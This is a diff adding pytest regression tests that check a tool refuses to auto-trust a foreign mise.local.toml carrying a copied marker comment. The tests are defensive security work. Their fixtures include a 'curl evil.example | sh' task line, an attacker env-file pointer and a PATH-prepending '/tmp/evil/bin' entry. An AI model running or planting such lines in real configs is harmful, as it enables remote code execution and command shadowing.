@@ -257,3 +257,100 @@ class TestMiseTrustsWhatWeWrote:
         monkeypatch.setattr(setupenv.subprocess, "run", _fail)
         _write(project)  # must not raise
         assert "mise trust" in capsys.readouterr().out
+
+
+class TestTrustRequiresRealOwnership:
+    """`_MISE_MARKER` is a public comment string, so it proves the text was COPIED, not that
+    harnessed wrote it. A `mise.local.toml` that arrives with a cloned repo can carry it — and
+    trusting on that basis would let whoever wrote the repo silently apply `[env]` to every shell
+    in the directory, which is the exact decision mise's prompt exists to keep with the user
+    (CWE-345, raised by CodeRabbit on PR #208).
+    """
+
+    def _write_foreign(self, project, body: str):
+        (project / "mise.local.toml").write_text(
+            f"{setupenv._MISE_MARKER}: looks like ours, is not\n{body}", encoding="utf-8"
+        )
+
+    def test_a_marker_only_file_is_never_trusted(self, project, trust_calls):
+        """The regression this class exists for: marker present, content foreign."""
+        self._write_foreign(project, "[env]\nEVIL = 'from-a-cloned-repo'\n")
+        _write(project)
+        assert trust_calls == []
+
+    def test_a_foreign_env_pointer_is_never_trusted(self, project, trust_calls):
+        """Right shape, wrong target — the pointer must name THIS project's dotenv, not a path
+        someone else chose."""
+        self._write_foreign(project, '[env]\n_.file = "/tmp/attacker.env"\n')
+        _write(project)
+        assert trust_calls == []
+
+    def test_a_foreign_task_is_never_trusted(self, project, trust_calls):
+        """A `[tasks]` table whose `run` is not a harnessed launch is not ours to vouch for."""
+        self._write_foreign(project, '[tasks.claude]\nrun = "curl evil.example | sh"\n')
+        _write(project)
+        assert trust_calls == []
+
+    def test_a_user_tools_table_is_never_trusted(self, project, trust_calls):
+        """A `[tools]` table is the user's, and a tools-only file needs no trust anyway."""
+        self._write_foreign(project, '[tools]\nnode = "24"\n')
+        _write(project)
+        assert trust_calls == []
+
+    def test_unparseable_toml_is_never_trusted(self, project, trust_calls):
+        self._write_foreign(project, "this is not = = toml\n")
+        _write(project)
+        assert trust_calls == []
+
+    def test_the_file_we_wrote_ourselves_is_still_trusted(self, project, trust_calls):
+        """The guard must reject foreign content without rejecting our own — otherwise it silently
+        turns the whole feature off."""
+        _write(project)
+        assert [c["argv"] for c in trust_calls] == [
+            ["mise", "trust", str(project / "mise.local.toml")]
+        ]
+
+
+class TestOwnershipCheckInIsolation:
+    """`_fully_harnessed_owned` is the security boundary, so exercise it directly as well.
+
+    The end-to-end tests above cannot isolate the pointer branch. Writing a foreign `_.file` into
+    the project config makes the launch append OURS beside it, and two `_.file` keys are a TOML
+    duplicate-key error — so the file is rejected as unparseable before the pointer is ever
+    compared. A mutation removing the pointer check therefore survived the end-to-end tests.
+
+    The path that really reaches it: a `mise.local.toml` copied from ANOTHER project (people do
+    copy these between repos), launched by a stack with no tool env of its own, so nothing is
+    appended, the file parses, and the only thing wrong is the target.
+    """
+
+    def test_a_pointer_at_another_projects_env_is_not_ours(self, project):
+        f = project / "mise.local.toml"
+        f.write_text('[env]\n_.file = "/tmp/some-other-project.env"\n', encoding="utf-8")
+        assert setupenv._fully_harnessed_owned(f, project) is False
+
+    def test_our_own_pointer_is_ours(self, project):
+        """The other half — a guard that rejected everything would pass the test above."""
+        f = project / "mise.local.toml"
+        f.write_text(
+            f'[env]\n_.file = "{setupenv._project_env_file(project)}"\n', encoding="utf-8"
+        )
+        assert setupenv._fully_harnessed_owned(f, project) is True
+
+    def test_a_sibling_directive_under_env_is_not_ours(self, project):
+        """`_.file` is not the only thing mise accepts under `_`. `_.path` PREPENDS to PATH, which
+        is a sharper vector than any variable: trust it and every command in that directory can be
+        shadowed. The pointer being correct does not make the rest of the table ours."""
+        f = project / "mise.local.toml"
+        f.write_text(
+            f'[env]\n_.file = "{setupenv._project_env_file(project)}"\n'
+            '_.path = "/tmp/evil/bin"\n',
+            encoding="utf-8",
+        )
+        assert setupenv._fully_harnessed_owned(f, project) is False
+
+    def test_an_empty_file_is_ours(self, project):
+        """Nothing to disagree with. Trusting it is a no-op and keeps first-launch simple."""
+        f = project / "mise.local.toml"
+        f.write_text("", encoding="utf-8")
+        assert setupenv._fully_harnessed_owned(f, project) is True
